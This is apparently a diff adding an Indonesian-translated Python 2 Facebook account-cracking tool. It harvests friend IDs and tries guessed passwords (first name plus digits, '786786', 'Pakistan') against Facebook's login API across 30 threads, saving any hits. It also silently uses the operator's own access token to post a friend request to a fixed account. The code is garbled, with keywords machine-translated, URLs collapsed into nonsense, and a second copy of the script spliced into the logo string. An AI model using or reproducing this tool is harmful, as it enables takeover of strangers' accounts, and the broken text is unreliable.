@@ -1,0 +1,837 @@
+#! / usr / bin / python2
+# coding = utf-8
+
+
+impor os, sys, waktu, datetime, acak, hashlib, re, threading, json, urllib, cookielib, permintaan, mekanisasi
+dari multiprocessing.pool import ThreadPool
+dari requests.exeption mengimpor ConnectionError
+dari mekanis impor Browser
+
+
+memuat ulang (sys)
+sys.setdefaultencoding ('utf8')
+br = mechanize.Browser ()
+br.set_handle_robots (False)
+br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1)
+br.addheaders = [('User-Agent', 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / Versi 2.12.423 / 12.16')]
+
+
+def keluar ():
+	cetak "\ 033 [1; 96m [!] \ x1b [1; 91mKeluar"
+	os.sys.exit ()
+
+
+def acak (b):
+    w = 'ahtdzjc'
+    d = ''
+    untuk saya dalam x:
+        d + = '!' + w [random.randint (0, len (w) -1)] + i
+    return cetak (d)
+
+
+def cetak (b):
+    w = 'ahtdzjc'
+    untuk saya di w:
+        j = w.index (i)
+        x = x.replace ('!% s'% i, '\ 033 [% s; 1m'% str (31 + j))
+    x + = '\ 033 [0m'
+    x = x.replace ('! 0', '\ 033 [0m')
+    sys.stdout.write (x + '\ n')
+
+
+def jalan (z):
+	untuk e in z + '\ n':
+		sys.stdout.write (e)
+		sys.stdout.flush ()
+		time.sleep (00000.1)
+
+
+##### LOGO #####
+logo = "" "
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ------ The Vile Techs -------- • ◈ •
+• ◈ • ----- █ -------------- #! / usr / bin / python2
+# coding = utf-8
+
+
+impor os, sys, waktu, datetime, acak, hashlib, re, threading, json, urllib, cookielib, permintaan, mekanisasi
+dari multiprocessing.pool import ThreadPool
+dari requests.exeption mengimpor ConnectionError
+dari mekanis impor Browser
+
+
+memuat ulang (sys)
+sys.setdefaultencoding ('utf8')
+br = mechanize.Browser ()
+br.set_handle_robots (False)
+br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1)
+br.addheaders = [('User-Agent', 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / Versi 2.12.423 / 12.16')]
+
+
+def keluar ():
+	cetak "\ 033 [1; 96m [!] \ x1b [1; 91mKeluar"
+	os.sys.exit ()
+
+
+def acak (b):
+    w = 'ahtdzjc'
+    d = ''
+    untuk saya dalam x:
+        d + = '!' + w [random.randint (0, len (w) -1)] + i
+    return cetak (d)
+
+
+def cetak (b):
+    w = 'ahtdzjc'
+    untuk saya di w:
+        j = w.index (i)
+        x = x.replace ('!% s'% i, '\ 033 [% s; 1m'% str (31 + j))
+    x + = '\ 033 [0m'
+    x = x.replace ('! 0', '\ 033 [0m')
+    sys.stdout.write (x + '\ n')
+
+
+def jalan (z):
+	untuk e in z + '\ n':
+		sys.stdout.write (e)
+		sys.stdout.flush ()
+		time.sleep (00000.1)
+
+
+##### LOGO #####
+logo = "" "
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ------ RAFLY PAKE I -------- • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+\ 033 [1; 91m =======================================
+\ 033 [1; 96mAuthor \ 033 [1; 93m: \ 033 [1; 92m Rafly pake i
+\ 033 [1; 96mYoutube \ 033 [1; 93m: \ 033 [1; 92m Rafly pake i
+\ 033 [1; 96mWa \ 033 [1; 93m: \ 033 [1; 92m 082-290-232-340
+\ 033 [1; 96mNote \ 033 [1; 93m: \ 033 [1; 92m IRI BILANG BOSS
+\ 033 [1; 91m ======================================= "" "
+
+def tik ():
+	titik = ['. ',' .. ',' ... ']
+	untuk o di titik:
+		cetak ("\ r \ 033 [1; 96m [●] \ x1b [1; 93mSilakan Tunggu \ x1b [1; 97m" + o),; sys.stdout.flush (); time.sleep (1)
+
+
+kembali = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\ 033 [31mNidak Vuln"
+vuln = "\ 033 [32mVuln"
+
+os.system ("hapus")
+print "\ 033 [1; 96m ========================================== =================== "
+cetak "" "\ 033 [1; 91m =======================================
+\ 033 [1; 96mAuthor \ 033 [1; 93m: \ 033 [1; 92m The Rafly pake i
+\ 033 [1; 96mYoutube \ 033 [1; 93m: \ 033 [1; 92m Rafly pake i
+\ 033 [1; 96mWa \ 033 [1; 93m: \ 033 [1; 92m 082-290-232-340
+\ 033 [1; 96mNote \ 033 [1; 93m: \ 033 [1; 92m IRI BILANG BOSS
+\ 033 [1; 91m ====================================== "" "
+cetak "\ x1b [1; 93m ========================================== =================== "
+
+CorrectUsername = "Rafly"
+CorrectPassword = "Pakei"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input ("\ 033 [1; 96m [☆] \ x1b [1; 93mUnama Alat \ x1b [1; 96m >>>>")
+    if (username == CorrectUsername):
+    	password = raw_input ("\ 033 [1; 96m [☆] \ x1b [1; 93mPassword Of Tool \ x1b [1; 96m >>>>")
+        if (password == CorrectPassword):
+            print "Berhasil masuk sebagai" + nama pengguna
+            loop = 'false'
+        lain:
+            cetak "Kata Sandi Salah"
+            os.system ('xdg-buka https://www.youtube.com/c/raflypakei2002')
+    lain:
+        cetak "Nama Pengguna Salah"
+        os.system ('xdg-buka https://www.youtube.com/c/raflypakei2002')
+
+def login ():
+	os.system ('jelas')
+	mencoba:
+		toket = buka ('login.txt', 'r')
+		Tidak bisa() 
+	kecuali (KeyError, IOError):
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		cetak ('\ 033 [1; 96m [☆] \ x1b [1; 93mLOGIN DENGAN FACEBOOK \ x1b [1; 96m [☆]'))
+		id = raw_input ('\ 033 [1; 96m [+] \ x1b [1; 93mID / Email \ x1b [1; 91m: \ x1b [1; 92m')
+		pwd = raw_input ('\ 033 [1; 96m [+] \ x1b [1; 93mPassword \ x1b [1; 91m: \ x1b [1; 92m')
+		tik ()
+		mencoba:
+			br.open ('https://m.facebook.com')
+		kecuali mekanisasi.
+			cetak "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi internet"
+			keluar ()
+		br._factory.is_html = Benar
+		br.select_form (nr = 0)
+		br.form ['email'] = id
+		br.form ['pass'] = pwd
+		mengirimkan ()
+		url = br.geturl ()
+		jika 'save-device' di url:
+			mencoba:
+				sig = 'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = kata sandiemail =' + id + 'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.logo04campanye_compartemenempat_data_companyangmemutukancetak_data_data_data_data_data_data_data_data_sekarang.html =
+				data = {"api_key": "882a8490361da98702bf97a021ddc14d", "credentials_type": "kata sandi", "email": id, "format": "JSON", "menghasilkan_machine_id": "1", "menghasilkan_session_cookies": "1", "," lokal ":" en_US "," metode ":" auth.login "," kata sandi ": pwd," return_ssl_resources ":" 0 "," v ":" 1.0 "}
+				x = hashlib.new ("md5")
+				x.perbarui (sig)
+				a = x.hexdigest ()
+				data.update ({'sig': a})
+				url = "https://api.facebook.com/restserver.php"
+				r = requests.get (url, params = data)
+				z = json.loads (r.text)
+				unikers = open ("login.txt", 'w')
+				unikers.write (z ['access_token'])
+				unikers.close ()
+				cetak '\ n \ 033 [1; 96m [✓] \ x1b [1; 92mLogin Berhasil'
+				os.system ('xdg-buka https://www.youtube.com/c/raflypakei2002')
+				requests.post ('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z [' access_token '])
+				Tidak bisa()
+			kecuali requests.exceptions.ConnectionError:
+				cetak "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi internet"
+				keluar ()
+		jika 'pos pemeriksaan' di url:
+			cetak ("\ n \ 033 [1; 96m [!] \ x1b [1; 91m Tampaknya akun Anda memiliki pos pemeriksaan")
+			os.system ('rm -rf login.txt')
+			time.sleep (1)
+			keluar ()
+		lain:
+			cetak ("\ n \ 033 [1; 96m [!] \ x1b [1; 91mPassword / Email salah")
+			os.system ('rm -rf login.txt')
+			time.sleep (1)
+			Gabung()
+
+
+menu def ():
+	os.system ('jelas')
+	mencoba:
+		toket = open ('login.txt', 'r'). read ()
+	kecuali IOError:
+		os.system ('jelas')
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os.system ('rm -rf login.txt')
+		time.sleep (1)
+		Gabung()
+	mencoba:
+		otw = requests.get ('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads (otw.text)
+		nama = a ['name']
+		id = a ['id']
+	kecuali KeyError:
+		os.system ('jelas')
+		cetak "\ 033 [1; 96m [!] \ 033 [1; 91m Tampaknya akun Anda memiliki pos pemeriksaan"
+		os.system ('rm -rf login.txt')
+		time.sleep (1)
+		Gabung()
+	kecuali requests.exceptions.ConnectionError:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi internet"
+		keluar ()
+	os.system ("hapus")
+	cetak logo
+	cetak 42 * "\ 033 [1; 96m ="
+	cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m Nama \ 033 [1; 91m: \ 033 [1; 92m" + nama + "\ 033 [ 1; 97 m "
+	cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m ID \ 033 [1; 91m: \ 033 [1; 92m" + id + "\ x1b [ 1; 97 m "
+	cetak 42 * "\ 033 [1; 96m ="
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m1 \ x1b [1; 96m] \ x1b [1; 93m Mulai Peretasan"
+	cetak "\ x1b [1; 96m [\ x1b [1; 91m0 \ x1b [1; 96m] \ x1b [1; Keluar 91m"
+	pilih ()
+
+
+def pilih ():
+	unikers = raw_input ("\ n \ 033 [1; 97m >>> \ 033 [1; 97m")
+	jika unikers == "":
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih ()
+	elif unikers == "1":
+		super()
+	elif unikers == "0":
+		jalan ('Token Removed')
+		os.system ('rm -rf login.txt')
+		keluar ()
+	lain:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih ()
+
+
+def super ():
+	toket global
+	os.system ('jelas')
+	mencoba:
+		toket = open ('login.txt', 'r'). read ()
+	kecuali IOError:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os.system ('rm -rf login.txt')
+		time.sleep (1)
+		Gabung()
+	os.system ('jelas')
+	cetak logo
+	cetak 42 * "\ 033 [1; 96m ="
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m1 \ x1b [1; 96m] \ x1b [1; 93m Retas Dari Daftar Teman"
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m2 \ x1b [1; 96m] \ x1b [1; 93m Retas Dari ID Publik Apa Pun"
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m3 \ x1b [1; 96m] \ x1b [1; 93m Retas Dari File"
+	cetak "\ x1b [1; 96m [\ x1b [1; 91m0 \ x1b [1; 96m] \ x1b [1; 91m Kembali"
+	pilih_super ()
+
+def pilih_super ():
+	peak = raw_input ("\ n \ 033 [1; 97m >>> \ 033 [1; 97m")
+	jika puncak == "":
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih_super ()
+	elif peak == "1":
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93m ID Penerima \ 033 [1; 97m ...')
+		r = requests.get ("https://graph.facebook.com/me/friends?access_token=" + toket)
+		z = json.loads (r.text)
+		untuk s in z ['data']:
+			id.append (s ['id'])
+	elif peak == "2":
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		idt = raw_input ("\ 033 [1; 96m [+] \ 033 [1; 93mEnter ID \ 033 [1; 91m: \ 033 [1; 97m")
+		mencoba:
+			jok = requests.get ("https://graph.facebook.com/" + idt + "? access_token =" + toket)
+			op = json.loads (jok.text)
+			cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mName \ 033 [1; 91m: \ 033 [1; 97m" + op ["name"]
+		kecuali KeyError:
+			cetak "\ 033 [1; 96m [!] \ x1b [1; 91mID Tidak Ditemukan!"
+			raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mBack \ 033 [1; 96m]")
+			super()
+		jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mDapat ID \ 033 [1; 97m ...')
+		r = requests.get ("https://graph.facebook.com/" + idt + "/ friends? access_token =" + toket)
+		z = json.loads (r.text)
+		untuk saya dalam z ['data']:
+			id.append (i ['id'])
+	elif peak == "3":
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		mencoba:
+			idlist = raw_input ('\ x1b [1; 96m [+] \ x1b [1; 93mEnter File Path \ x1b [1; 91m: \ x1b [1; 97m')
+			untuk baris terbuka (idlist, 'r'). readlines ():
+				id.append (line.strip ())
+		kecuali IOError:
+			cetak '\ x1b [1; 96m [!] \ x1b [1; 91mFile Tidak Ditemukan'
+			raw_input ('\ n \ x1b [1; 96m [\ x1b [1; 97mBack \ x1b [1; 96m]')
+			super()
+	elif peak == "0":
+		Tidak bisa()
+	lain:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih_super ()
+	
+	cetak "\ 033 [1; 96m [+] \ 033 [1; 93mJumlah Total \ 033 [1; 91m: \ 033 [1; 97m" + str (len (id))
+	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...')
+	titik = ['. ',' .. ',' ... ']
+	untuk o di titik:
+		cetak ("\ r \ 033 [1; 96m [\ 033 [1; 97m✸ \ 033 [1; 96m] \ 033 [1; 93mMelacak \ 033 [1; 97m" + o),; sys.stdout.flush ( ); time.sleep (1)
+	mencetak
+	cetak ('\ x1b [1; 96m [!] \ x1b [1; 93mUntuk Menghentikan Proses Tekan CTRL Lalu Tekan z')
+	cetak 42 * "\ 033 [1; 96m ="
+	
+			
+	def main (arg):
+		cekpoint global, oks
+		pengguna = arg
+		mencoba:
+			os.mkdir ('keluar')
+		kecuali OSError:
+			lulus
+		mencoba:
+			a = requests.get ('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			b = json.loads (a.text)
+			pass1 = ('786786')
+			data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&=) & password == password & user == password & user == password & user == password & user == password & user == password & user == password & user == password & password urus 'user_atau) (kata sandi) + passup & password = password = user + password = user + password = password + user = password + password = user & password = password + password = user & password = password = password + password = password & password urus ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load (data)
+			jika 'access_token' di q:
+				cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass1
+				oks.append (pengguna + pass1)
+			lain:
+				jika 'www.facebook.com' di q ["error_msg"]:
+					cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass1
+					cek = open ("out / checkpoint.txt", "a")
+					cek.write (pengguna + "|" + pass1 + "\ n")
+					cek.close ()
+					cekpoint.append (pengguna + pass1)
+				lain:
+					pass2 = b ['first_name'] + '12345'
+					data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&=) & password == password & user == password & user == password & user == password & user == password & urus = user & urus == user & ur=intem = password = password & urus 'user =" password & password = password = user & password == user & password = password = password & password = password = password & password urus ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+					q = json.load (data)
+					jika 'access_token' di q:
+						cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass2
+						oks.append (pengguna + pass2)
+					lain:
+						jika 'www.facebook.com' di q ["error_msg"]:
+							cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass2
+							cek = open ("out / checkpoint.txt", "a")
+							cek.write (pengguna + "|" + pass2 + "\ n")
+							cek.close ()
+							cekpoint.append (pengguna + pass2)
+						lain:
+							pass3 = b ['first_name'] + '123'
+							data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&=" kata sandi + URL + & urus== ur & user = password & urus 'user = "password & user == password & user == password & user == password & urus' user =" password & user == user & password = password = user & password = user + password = password = user & password = password = user & password == user & password = password + password = password & password urus) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+							q = json.load (data)
+							jika 'access_token' di q:
+								cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass3
+								oks.append (pengguna + pass3)
+							lain:
+								jika 'www.facebook.com' di q ["error_msg"]:
+									cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass3
+									cek = open ("out / checkpoint.txt", "a")
+									cek.write (pengguna + "|" + pass3 + "\ n")
+									cek.close ()
+									cekpoint.append (pengguna + pass3)
+								lain:
+									pass4 = 'Pakistan'
+									data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & urus==&&= urour) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+									q = json.load (data)
+									jika 'access_token' di q:
+										cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass4
+										oks.append (pengguna + pass4)
+									lain:
+										jika 'www.facebook.com' di q ["error_msg"]:
+											cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass4
+											cek = open ("out / checkpoint.txt", "a")
+											cek.write (pengguna + "|" + pass4 + "\ n")
+											cek.close ()
+											cekpoint.append (pengguna + pass4)
+										lain:
+											pass5 = b ['first_name'] + '12'
+											data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & ur=== urellib) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+											q = json.load (data)
+											jika 'access_token' di q:
+												cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass5
+												oks.append (pengguna + pass5)
+											lain:
+												jika 'www.facebook.com' di q ["error_msg"]:
+													cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass5
+													cek = open ("out / checkpoint.txt", "a")
+													cek.write (pengguna + "|" + pass5 + "\ n")
+													cek.close ()
+													cekpoint.append (pengguna + pass5)
+												lain:
+													pass6 = b ['first_name'] + '1234'
+													data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2 password & password == + user == password & user == password & user == password & user == password & urus 'user =" password & user == user & password = password = user) & password = password = user & password = password = user & password = password = user & password == user & password == user & password = password = password & password = password = user == password & password = password == password ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+													q = json.load (data)
+													jika 'access_token' di q:
+														cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass6
+														oks.append (pengguna + pass6)
+													lain:
+														jika 'www.facebook.com' di q ["error_msg"]:
+															cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass6
+															cek = open ("out / checkpoint.txt", "a")
+															cek.write (pengguna + "|" + pass6 + "\ n")
+															cek.close ()
+															cekpoint.append (pengguna + pass6)
+														lain:
+															a = requests.get ('https://graph.facebook.com/'+user+'/?access_token='+toket)
+															b = json.loads (a.text)
+															pass7 = b ['first_name'] + '1122'
+															data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&=" kata sandi tempat + password & password) "password = user & user == password & user == password & user == password & user == password & user == password & password = password = user & password = password = user & password = password = user & password (password = user) & password == password & password = password = password & password urus ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+															q = json.load (data)
+															jika 'access_token' di q:
+																cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass7
+																oks.append (pengguna + pass7)
+															lain:
+																jika 'www.facebook.com' di q ["error_msg"]:
+																	cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass7
+																	cek = open ("out / checkpoint.txt", "a")
+																	cek.write (pengguna + "|" + pass7 + "\ n")
+																	cek.close ()
+																	cekpoint.append (pengguna + pass7)
+																	
+															
+		kecuali:
+			lulus
+		
+	p = ThreadPool (30)
+	p.map (utama, id)
+	cetak 42 * "\ 033 [1; 96m ="
+	print '\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mProses Telah Selesai \ 033 [1; 97m ....'
+	cetak "\ 033 [1; 96m [+] \ 033 [1; 92mTotal OK / \ x1b [1; 93mCP \ 033 [1; 91m: \ 033 [1; 92m" + str (len (oks)) + "\ 033 [1; 97m / \ 033 [1; 93m "+ str (len (cekpoint))
+	cetak ("\ 033 [1; 96m [+] \ 033 [1; File 92mCP Telah Disimpan \ 033 [1; 91m: \ 033 [1; 97mout / checkpoint.txt")
+	raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mBack \ 033 [1; 96m]")
+	Tidak bisa()
+
+if __name__ == '__main__':
+	Gabung()█ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+• ◈ • ----- █ -------------- █ ------ • ◈ •
+\ 033 [1; 91m =======================================
+\ 033 [1; 96mAuthor \ 033 [1; 93m: \ 033 [1; 92m The Vile Techs
+\ 033 [1; 96mYoutube \ 033 [1; 93m: \ 033 [1; 92m The Vile Techs
+\ 033 [1; 96mFacebook \ 033 [1; 93m: \ 033 [1; 92m The Vile Techs
+\ 033 [1; 96mGithub \ 033 [1; 93m: \ 033 [1; 92mhttps: //github.com/theviletechs
+\ 033 [1; 91m ======================================= "" "
+
+def tik ():
+	titik = ['. ',' .. ',' ... ']
+	untuk o di titik:
+		cetak ("\ r \ 033 [1; 96m [●] \ x1b [1; 93mSilakan Tunggu \ x1b [1; 97m" + o),; sys.stdout.flush (); time.sleep (1)
+
+
+kembali = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\ 033 [31mNidak Vuln"
+vuln = "\ 033 [32mVuln"
+
+os.system ("hapus")
+print "\ 033 [1; 96m ========================================== =================== "
+cetak "" "\ 033 [1; 91m =======================================
+\ 033 [1; 96mAuthor \ 033 [1; 93m: \ 033 [1; 92m The Vile Techs
+\ 033 [1; 96mYoutube \ 033 [1; 93m: \ 033 [1; 92m The Vile Techs
+\ 033 [1; 96mFacebook \ 033 [1; 93m: \ 033 [1; 92m The Vile Techs
+\ 033 [1; 96mGithub \ 033 [1; 93m: \ 033 [1; 92m github.com/theviletechs
+\ 033 [1; 91m ====================================== "" "
+cetak "\ x1b [1; 93m ========================================== =================== "
+
+CorrectUsername = "The Vile Techs"
+CorrectPassword = "waqasahmed"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input ("\ 033 [1; 96m [☆] \ x1b [1; 93mUnama Alat \ x1b [1; 96m >>>>")
+    if (username == CorrectUsername):
+    	password = raw_input ("\ 033 [1; 96m [☆] \ x1b [1; 93mPassword Of Tool \ x1b [1; 96m >>>>")
+        if (password == CorrectPassword):
+            print "Berhasil masuk sebagai" + nama pengguna
+            loop = 'false'
+        lain:
+            cetak "Kata Sandi Salah"
+            os.system ('xdg-buka https://youtu.be/y8SfVqjOjEE')
+    lain:
+        cetak "Nama Pengguna Salah"
+        os.system ('xdg-buka https://youtu.be/y8SfVqjOjEE')
+
+def login ():
+	os.system ('jelas')
+	mencoba:
+		toket = buka ('login.txt', 'r')
+		Tidak bisa() 
+	kecuali (KeyError, IOError):
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		cetak ('\ 033 [1; 96m [☆] \ x1b [1; 93mLOGIN DENGAN FACEBOOK \ x1b [1; 96m [☆]'))
+		id = raw_input ('\ 033 [1; 96m [+] \ x1b [1; 93mID / Email \ x1b [1; 91m: \ x1b [1; 92m')
+		pwd = raw_input ('\ 033 [1; 96m [+] \ x1b [1; 93mPassword \ x1b [1; 91m: \ x1b [1; 92m')
+		tik ()
+		mencoba:
+			br.open ('https://m.facebook.com')
+		kecuali mekanisasi.
+			cetak "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi internet"
+			keluar ()
+		br._factory.is_html = Benar
+		br.select_form (nr = 0)
+		br.form ['email'] = id
+		br.form ['pass'] = pwd
+		mengirimkan ()
+		url = br.geturl ()
+		jika 'save-device' di url:
+			mencoba:
+				sig = 'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = kata sandiemail =' + id + 'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.logo04campanye_compartemenempat_data_companyangmemutukancetak_data_data_data_data_data_data_data_data_sekarang.html =
+				data = {"api_key": "882a8490361da98702bf97a021ddc14d", "credentials_type": "kata sandi", "email": id, "format": "JSON", "menghasilkan_machine_id": "1", "menghasilkan_session_cookies": "1", "," lokal ":" en_US "," metode ":" auth.login "," kata sandi ": pwd," return_ssl_resources ":" 0 "," v ":" 1.0 "}
+				x = hashlib.new ("md5")
+				x.perbarui (sig)
+				a = x.hexdigest ()
+				data.update ({'sig': a})
+				url = "https://api.facebook.com/restserver.php"
+				r = requests.get (url, params = data)
+				z = json.loads (r.text)
+				unikers = open ("login.txt", 'w')
+				unikers.write (z ['access_token'])
+				unikers.close ()
+				cetak '\ n \ 033 [1; 96m [✓] \ x1b [1; 92mLogin Berhasil'
+				os.system ('xdg-buka https://www.youtube.com/c/TheVileTechs')
+				requests.post ('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z [' access_token '])
+				Tidak bisa()
+			kecuali requests.exceptions.ConnectionError:
+				cetak "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi internet"
+				keluar ()
+		jika 'pos pemeriksaan' di url:
+			cetak ("\ n \ 033 [1; 96m [!] \ x1b [1; 91m Tampaknya akun Anda memiliki pos pemeriksaan")
+			os.system ('rm -rf login.txt')
+			time.sleep (1)
+			keluar ()
+		lain:
+			cetak ("\ n \ 033 [1; 96m [!] \ x1b [1; 91mPassword / Email salah")
+			os.system ('rm -rf login.txt')
+			time.sleep (1)
+			Gabung()
+
+
+menu def ():
+	os.system ('jelas')
+	mencoba:
+		toket = open ('login.txt', 'r'). read ()
+	kecuali IOError:
+		os.system ('jelas')
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os.system ('rm -rf login.txt')
+		time.sleep (1)
+		Gabung()
+	mencoba:
+		otw = requests.get ('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads (otw.text)
+		nama = a ['name']
+		id = a ['id']
+	kecuali KeyError:
+		os.system ('jelas')
+		cetak "\ 033 [1; 96m [!] \ 033 [1; 91m Tampaknya akun Anda memiliki pos pemeriksaan"
+		os.system ('rm -rf login.txt')
+		time.sleep (1)
+		Gabung()
+	kecuali requests.exceptions.ConnectionError:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi internet"
+		keluar ()
+	os.system ("hapus")
+	cetak logo
+	cetak 42 * "\ 033 [1; 96m ="
